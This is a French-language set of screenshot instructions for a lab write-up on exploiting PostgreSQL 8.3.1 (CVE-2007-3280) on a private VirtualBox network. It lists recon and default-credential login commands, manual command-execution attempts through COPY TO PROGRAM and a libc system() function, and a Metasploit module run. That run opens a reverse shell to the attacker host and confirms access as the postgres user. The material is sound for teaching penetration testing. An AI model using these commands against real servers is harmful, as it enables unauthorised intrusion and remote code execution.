# Captures — PostgreSQL 8.3.1 (RCE via UDF, port 5432, CVE-2007-3280)

Consignes de capture pour `services/postgresql.html` (à construire). Commandes identiques à
`ms1/josa/postgresql.md`.

> IP de ce poste (josa, réseau `vboxnet0`) : cible `192.168.56.102`, Kali `192.168.56.1`.
> (Le coéquipier est sur `172.28.128.x` — ses captures à lui utiliseront ses propres IP.)

## 01-recon-auth.png

Les deux commandes à la suite :
```bash
nmap -sC -sV -p 5432 192.168.56.102
PGPASSWORD=postgres psql -h 192.168.56.102 -U postgres -c "SELECT version(); SELECT usename, usesuper FROM pg_user WHERE usename='postgres';"
```

Encadré en rouge : `PostgreSQL DB 8.3.0 - 8.3.7` et `usesuper = t`.

## 02-tentatives-manuelles.png

Les deux tentatives échouées à la suite :
```bash
PGPASSWORD=postgres psql -h 192.168.56.102 -U postgres -c "COPY (SELECT 1) TO PROGRAM 'id';"
PGPASSWORD=postgres psql -h 192.168.56.102 -U postgres -c "CREATE OR REPLACE FUNCTION sys_exec(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE C STRICT;"
```

Encadré en rouge : `syntax error at or near "PROGRAM"` et `missing magic block` — les deux
échecs expliqués dans le write-up (version trop ancienne, puis contre-mesure du serveur).

## 03-recherche-cve.png

Commande :
```bash
msfconsole -q -x "info exploit/linux/postgres/postgres_payload; exit"
```

Encadré en rouge : la section `Description` (mécanisme : compte postgres écrit dans /tmp, UDF
chargée) et `https://nvd.nist.gov/vuln/detail/CVE-2007-3280`.

## 04-exploit-msf.png

Dans `msfconsole`, lancement du module :
```
msf6 > use exploit/linux/postgres/postgres_payload
msf6 exploit(linux/postgres/postgres_payload) > set RHOSTS 192.168.56.102
msf6 exploit(linux/postgres/postgres_payload) > set PASSWORD postgres
msf6 exploit(linux/postgres/postgres_payload) > set PAYLOAD linux/x86/shell/reverse_tcp
msf6 exploit(linux/postgres/postgres_payload) > set LHOST 192.168.56.1
msf6 exploit(linux/postgres/postgres_payload) > set LPORT 4447
msf6 exploit(linux/postgres/postgres_payload) > exploit -z
[*] Uploaded as /tmp/wltnxZOA.so, should be cleaned up automatically
[*] Command shell session 1 opened (192.168.56.1:4447 -> 192.168.56.102:...)
```

Encadré en rouge : `Uploaded as /tmp/....so` (confirme le mécanisme lu dans la capture 03) et
`Command shell session 1 opened`.

## 05-session-proof.png

Suite du même terminal :
```
msf6 exploit(linux/postgres/postgres_payload) > sessions -i 1 -c id
uid=108(postgres) gid=117(postgres) groups=114(ssl-cert),117(postgres)
```

Encadré en rouge : `uid=108(postgres) ...` — la preuve d'accès.
